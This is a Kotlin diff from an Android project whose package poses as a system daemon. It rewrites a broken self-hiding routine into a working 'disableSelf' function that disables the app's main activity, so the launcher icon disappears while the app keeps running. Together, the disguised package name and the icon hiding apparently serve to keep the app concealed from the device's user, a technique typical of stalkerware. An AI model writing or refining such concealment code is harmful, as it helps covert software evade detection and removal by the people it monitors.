@@ -1,22 +1,17 @@
 package com.android.system.daemon
 
-import android.app.Application
+import android.content.ComponentName
+import android.content.Context
 import android.content.pm.PackageManager
 
-class AppContext : Application() {
-    override fun onCreate() {
-        super.onCreate()
-        hideSelf()
-    }
+object AppContext {
 
-    private fun hideSelf() {
-        try {
-            packageManager.setComponentEnabledSetting(
-                packageName,
-                componentName,
-                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                PackageManager.DONT_KILL_APP
-            )
-        } catch (_: Exception) {}
+    fun disableSelf(context: Context) {
+        val component = ComponentName(context, MainActivity::class.java)
+        context.packageManager.setComponentEnabledSetting(
+            component,
+            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+            PackageManager.DONT_KILL_APP
+        )
     }
 }
